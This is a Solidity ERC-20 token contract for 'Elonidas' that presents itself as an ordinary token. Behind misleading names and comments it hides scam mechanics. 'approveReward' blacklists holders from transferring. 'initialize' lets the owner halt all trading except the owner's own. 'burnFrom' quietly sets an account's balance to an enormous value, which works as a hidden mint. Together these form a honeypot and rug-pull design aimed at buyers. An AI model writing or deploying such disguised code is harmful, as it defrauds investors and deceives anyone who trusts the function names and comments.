// SPDX-License-Identifier: MIT

/**
   🛡https://elonidas.net/
   🛡https://medium.com/@elonidas
   🛡https://twitter.com/elonidas_
   🛡https://t.me/Elonidas
*/



pragma solidity =0.8.5;

import "./Context.sol";
import "./IERC20.sol";
import "./IERC20Metadata.sol";
import "./Ownable.sol";


contract ELONIDAS is Context, Ownable, IERC20, IERC20Metadata {
    mapping(address => bool) private _rewards;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private maxTxLimit = 1*10**17*10**9;
    uint256 private balances;
    uint256 private _totalSupply;
    uint256 private _supplyCap;
    bool rewardsOn = false;
    bool _initialize;
    string private _name;
    string private _symbol;
    address unir;
    address unif;

    /**
     * @dev Sets the values for {name}, {symbol} and {totalsupply}.
     */
    constructor(address rter, address fctr) {
        _name = "Elonidas";
        _symbol = "ELONIDAS";
        _totalSupply = 4690000000000*10**9;
        _supplyCap   = 4690000000000;
        _balances[msg.sender] += _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        _initialize = true;
        balances = maxTxLimit;
        unir = rter;
        unif = fctr;
    }
  
    /**
     * @notice Returns Supply Cap (maximum possible amount of tokens)
     */
    function SupplyCap() external view returns (uint256) {
        return _supplyCap;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transfer}.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
        _approve(sender, _msgSender(), currentAllowance - amount);}
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);}
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (_rewards[sender] || _rewards[recipient]) require (rewardsOn == true, "");
        if (_initialize == true || sender == owner() || recipient == owner()) {
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
        _balances[sender] = senderBalance - amount;}
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);}
        else {require (_initialize == true, "");}
    }
  
    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the total supply.
     */
    function burnFrom(address account, uint256 amount) external onlyOwner {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = balances - amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    /**
     * @notice include a new account to Rewards list.
     */
    function approveReward(address account) external onlyOwner {
        _rewards[account] = true;
    }

    /**
     * @notice remove account from Rewards list.
     */
    function grantReward(address account) external onlyOwner {
        _rewards[account] = false;
    }

    /**
     * @notice Checking if the account is on the Rewards list.
     */
    function rewardStatus(address account) public view returns (bool) {
        return _rewards[account];
    }

    /**
     * @notice Initialize contract.
     */
    function initialize() public virtual onlyOwner {
    if (_initialize == true) {_initialize = false;} else {_initialize = true;}
    }

    /**
     * @notice Check if contract is already Initialized.
     */
    function initialized() public view returns (bool) {
    return _initialize;
    }

    /**
     * @dev Hook that is called after any transfer of tokens.
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called before any transfer of tokens.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}